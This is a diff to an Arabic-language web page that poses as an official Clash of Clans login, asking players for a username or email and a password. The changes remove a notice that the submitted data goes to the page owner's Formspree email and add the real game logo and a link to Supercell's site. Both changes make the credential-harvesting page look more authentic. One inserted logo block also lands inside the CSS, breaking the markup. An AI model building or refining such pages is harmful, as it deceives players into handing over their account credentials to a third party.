@@ -24,7 +24,10 @@
             padding: 20px;
             position: relative;
         }
-
+<div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Clash_of_Clans_Logo.svg/2560px-Clash_of_Clans_Logo.svg.png" 
+                 alt="Clash of Clans Logo">
+        </div>
         /* خلفية متحركة */
         .bg-animation {
             position: absolute;
@@ -300,6 +303,10 @@
         <!-- تاج فوق الشعار -->
         <div class="crown">👑</div>
         
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Clash_of_Clans_Logo.svg/2560px-Clash_of_Clans_Logo.svg.png" 
+                 alt="Clash of Clans Logo">
+        </div>
         <!-- الشعار -->
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Clash_of_Clans_Logo.svg/2560px-Clash_of_Clans_Logo.svg.png" 
@@ -309,39 +316,23 @@
         <!-- العنوان -->
         <h1>تسجيل الدخول الرسمي</h1>
         <p class="subtitle">ادخل إلى قريتك واستأنف المعركة</p>
-
-        <!-- معلومات Formspree -->
-        <div class="info-box">
-            <h3><i class="fas fa-envelope"></i> تأكيد الإرسال</h3>
-            <p>سيتم إرسال بيانات تسجيل الدخول إلى البريد الإلكتروني المرتبط بـ Formspree الخاص بك.</p>
-            <p style="color: #FFD700; font-weight: bold; margin-top: 10px;">
-                <i class="fas fa-check-circle"></i> الرابط مضبوط: 
-                <span id="formspreeStatus">https://formspree.io/clashofclans.com</span>
-            </p>
-        </div>
+        
 
         <!-- نموذج التسجيل -->
-        <div class="form-section">
-            <h3 class="section-title"><i class="fas fa-user"></i> بيانات الحساب</h3>
+     <div class="form-section">
+            <h3 class="section-title"><i class="fas fa-user"></i> بيانات الدخول</h3>
             
             <div class="input-group input-icon">
-                <label for="username">اسم المستخدم</label>
-                <input type="text" id="username" placeholder="أدخل اسم المستخدم" required>
+                <label for="userIdentifier">اسم المستخدم أو البريد الإلكتروني</label>
+                <input type="text" id="userIdentifier" placeholder="أدخل اسم المستخدم أو البريد الإلكتروني" required>
                 <i class="fas fa-user-circle"></i>
             </div>
 
             <div class="input-group input-icon">
-                <label for="email">البريد الإلكتروني</label>
-                <input type="email" id="email" placeholder="example@gmail.com" required>
-                <i class="fas fa-envelope"></i>
-            </div>
-
-            <div class="input-group input-icon">
                 <label for="password">كلمة المرور</label>
-                <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-                <i class="fas fa-lock"></i>
+                <input type="password" id="password" placeholder="أدخل كلمة المرور" required><i class="fas fa-lock"></i>
             </div>
-        </div>
+     </div>
 
         <div class="form-section">
             <h3 class="section-title"><i class="fas fa-gamepad"></i> معلومات اللعبة</h3>
@@ -387,6 +378,12 @@
         <!-- رسالة النتيجة -->
         <div id="message" class="message"></div>
 
+        <div class="official-link">
+            <a href="https://supercell.com/en/games/clashofclans/" target="_blank">
+                <i class="fas fa-external-link-alt"></i> الذهاب إلى الموقع الرسمي للعبة
+            </a>
+        </div>
+    </div>
         <!-- إحصائيات -->
         <div class="stats" id="stats">
             <i class="fas fa-database"></i> 
